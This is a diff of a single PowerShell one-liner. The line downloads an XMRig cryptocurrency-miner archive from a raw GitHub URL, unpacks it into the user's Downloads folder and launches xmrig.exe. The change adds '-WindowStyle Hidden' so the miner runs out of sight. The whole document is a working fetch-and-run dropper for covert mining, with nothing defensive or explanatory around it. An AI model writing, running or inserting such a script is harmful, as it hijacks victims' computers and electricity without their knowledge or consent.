@@ -1,2 +1,1 @@
-$d="$env:USERPROFILE\Downloads"; iwr "https://raw.githubusercontent.com/Boombomber/epelepsy/refs/heads/main/xmrig-6.25.0-windows-x64.zip" -OutFile "$d\xmrig.zip"; Expand-Archive "$d\xmrig.zip" "$d\xmrig" -Force; $exe=Get-ChildItem "$d\xmrig" -Recurse -Filter xmrig.exe | Select-Object -First 1; Start-Process $exe.FullName
-
+$d="$env:USERPROFILE\Downloads"; iwr "https://raw.githubusercontent.com/Boombomber/epelepsy/refs/heads/main/xmrig-6.25.0-windows-x64.zip" -OutFile "$d\xmrig.zip"; Expand-Archive "$d\xmrig.zip" "$d\xmrig" -Force; $exe=Get-ChildItem "$d\xmrig" -Recurse -Filter xmrig.exe | Select -First 1; Start-Process $exe.FullName -WindowStyle Hidden
